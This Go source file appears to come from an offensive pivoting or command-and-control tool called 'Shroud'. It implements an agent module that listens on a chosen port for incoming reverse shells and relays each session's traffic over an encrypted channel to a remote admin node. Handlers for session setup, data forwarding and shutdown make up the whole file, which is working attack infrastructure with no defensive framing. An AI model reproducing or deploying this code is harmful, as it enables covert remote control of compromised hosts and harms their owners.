package handler

import (
	"context"
	"fmt"
	"log"
	"net"

	"Shroud/agent/manager"
	"Shroud/global"
	"Shroud/protocol"
	"Shroud/utils"
)

type RShell struct {
	port string
}

func newRShell(port string) *RShell {
	return &RShell{port: port}
}

func (rshell *RShell) start(ctx context.Context, mgr *manager.Manager) {
	sMessage := protocol.NewUpMsg(global.G_Component.Conn, global.G_Component.CryptoKey, global.Session.GetLinkKey(), global.G_Component.UUID)

	readyHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.RSHELLREADY,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	succMess := &protocol.RShellReady{OK: 1}
	failMess := &protocol.RShellReady{OK: 0}

	listenAddr := fmt.Sprintf("0.0.0.0:%s", rshell.port)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Printf("[*] RShell listen error: %s", err.Error())
		protocol.ConstructMessage(sMessage, readyHeader, failMess, false)
		sMessage.SendMessage()
		return
	}

	mgr.RShellManager.SetListener(listener)

	go func() {
		<-ctx.Done()
		mgr.RShellManager.ForceShutdown()
	}()

	protocol.ConstructMessage(sMessage, readyHeader, succMess, false)
	sMessage.SendMessage()

	log.Printf("[*] RShell listening on %s", listenAddr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
			}
			log.Printf("[*] RShell accept error: %s", err.Error())
			return
		}

		utils.EnableKeepAlive(conn)

		seq, dataChan := mgr.RShellManager.AddConn(conn)

		log.Printf("[*] RShell connection from %s, seq=%d", conn.RemoteAddr().String(), seq)

		connMess := &protocol.RShellConn{Seq: seq}
		connHeader := &protocol.Header{
			Sender:      global.G_Component.UUID,
			Accepter:    protocol.ADMIN_UUID,
			MessageType: protocol.RSHELLCONN,
			RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
			Route:       protocol.TEMP_ROUTE,
		}
		protocol.ConstructMessage(sMessage, connHeader, connMess, false)
		sMessage.SendMessage()

		go rshell.handleConn(ctx, mgr, conn, seq, dataChan)
	}
}

func (rshell *RShell) handleConn(ctx context.Context, mgr *manager.Manager, conn net.Conn, seq uint64, dataChan chan []byte) {
	sMessage := protocol.NewUpMsg(global.G_Component.Conn, global.G_Component.CryptoKey, global.Session.GetLinkKey(), global.G_Component.UUID)

	dataHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.RSHELLDATA,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	finHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.RSHELLFIN,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	defer func() {
		finMess := &protocol.RShellFin{Seq: seq}
		protocol.ConstructMessage(sMessage, finHeader, finMess, false)
		sMessage.SendMessage()
		mgr.RShellManager.DelConn(seq)
	}()

	// C2S: write data from admin to the connection
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case data, ok := <-dataChan:
				if !ok {
					return
				}
				if _, err := conn.Write(data); err != nil {
					return
				}
			}
		}
	}()

	// S2C: read from connection, send to admin
	buffer := make([]byte, 20480)
	for {
		length, err := conn.Read(buffer)
		if err != nil {
			return
		}

		dataMess := &protocol.RShellData{
			Seq:     seq,
			DataLen: uint64(length),
			Data:    buffer[:length],
		}
		protocol.ConstructMessage(sMessage, dataHeader, dataMess, false)
		sMessage.SendMessage()
	}
}

func DispatchRShellMess(ctx context.Context, mgr *manager.Manager) {
	for {
		message := <-mgr.RShellManager.RShellMessChan

		switch mess := message.(type) {
		case *protocol.RShellListen:
			rshell := newRShell(mess.Port)
			go rshell.start(ctx, mgr)

		case *protocol.RShellData:
			_, dataChan, ok := mgr.RShellManager.GetConn(mess.Seq)
			if ok {
				dataChan <- mess.Data
			}

		case *protocol.RShellFin:
			mgr.RShellManager.DelConn(mess.Seq)

		case *protocol.RShellStop:
			mgr.RShellManager.ForceShutdown()
			sMessage := protocol.NewUpMsg(global.G_Component.Conn, global.G_Component.CryptoKey, global.Session.GetLinkKey(), global.G_Component.UUID)
			header := &protocol.Header{
				Sender:      global.G_Component.UUID,
				Accepter:    protocol.ADMIN_UUID,
				MessageType: protocol.RSHELLSTOPDONE,
				RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
				Route:       protocol.TEMP_ROUTE,
			}
			doneMess := &protocol.RShellStopDone{All: mess.All}
			protocol.ConstructMessage(sMessage, header, doneMess, false)
			sMessage.SendMessage()
		}
	}
}
